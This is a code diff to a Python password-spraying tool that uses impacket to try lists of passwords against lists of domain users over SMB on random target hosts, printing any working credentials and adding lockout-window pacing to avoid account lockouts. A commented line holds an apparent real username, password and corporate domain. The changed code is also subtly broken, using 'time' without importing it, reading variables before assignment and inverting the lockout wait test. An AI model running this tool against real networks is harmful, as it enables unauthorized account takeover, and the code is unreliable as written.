@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, sys
+import argparse, sys, random
 import impacket
 from impacket.smbconnection import SMBConnection
 
@@ -22,11 +22,13 @@ def main():
     parser.add_argument('-d',  '--domain', help='Target domain. Ex. firenation.com')
     parser.add_argument('-u',  '--userlist', help='List of users to spray')
     parser.add_argument('-p',  '--passlist', help='List of password attempts')
+    parser.add_argument('-a',  '--attempts', help='Number of password attemptsper lockout window')
+    parser.add_argument('-l',  '--lockout_window', help='Lockout window (in minutes)')
     parser.add_argument('-wg',  '--global_wait', help='Seconds to wait between auth attempts (global). Default: none')
     parser.add_argument('-wt',  '--target_wait', help='Seconds to wait between auth attempts (just per target). Default: none')
 
     args = parser.parse_args()   
-    if args.targets and args.userlist and args.passlist and args.domain:
+    if args.targets and args.userlist and args.passlist and args.domain and args.lockout_window and args.attempts:
         try:
             with open(args.targets) as targetfile:
                 targets = targetfile.readlines()
@@ -38,12 +40,14 @@ def main():
                 passwds = passfile.readlines()
                 passwds = [x.strip() for x in passwds]
             domain = args.domain
+            lockout_window = args.lockout_window
+            attempts = args.attempts
         except Exception as e:
             print(e)
-            print('[-] --targets, --userlist, and --passlist must be line-separated files. Oh. And you need a --domain.')
+            print('[-] --targets, --userlist, and --passlist must be line-separated files. Oh. And you need a --domain. You\'re probably missing something else too.')
             sys.exit()
     else:
-        print('[-] Required: --targets, --userlist, --passlist')
+        print('[-] Missing args. Check -h')
         sys.exit()
     if args.global_wait:
         try:
@@ -66,12 +70,26 @@ def main():
 
     # Main logic
     #attempt = smb_login('127.0.0.1', 'corp.checkfree.com', 'jake', 'J@k3jake')
-    #attempt = smb_login('10.141.68.131', 'corp.checkfree.com', 'jake', 'J@k3jake')
-    for user in users:
-        if attempt:
-            print(attempt)
-        else:
-            print('connection failed')
+    lockout_seconds = lockout_window * 60
+    attempts = 0
+    time_start = time.time()
+    for password in passwds:
+        attempts += 1
+        print('[*] STATUS: Spraying with '+password)
+        for user in users:
+            while rando_target == last_target:
+                rando_target = random.choice(targets)
+            attempt = smb_login(rando_target, domain, user, password)
+            if attempt and attempt == 1:
+                print('[+] SUCCESS: '+domain+'\\'+user+':'+password)
+            else:
+                continue 
+                #print('connection failed')
+            last_target = rando_target
+        time_end = time.time()
+        while (time_end - time_start) > lockout_seconds:
+            time.sleep(60)
+            time_end = time.time()
 
 if __name__ == "__main__":
     main()
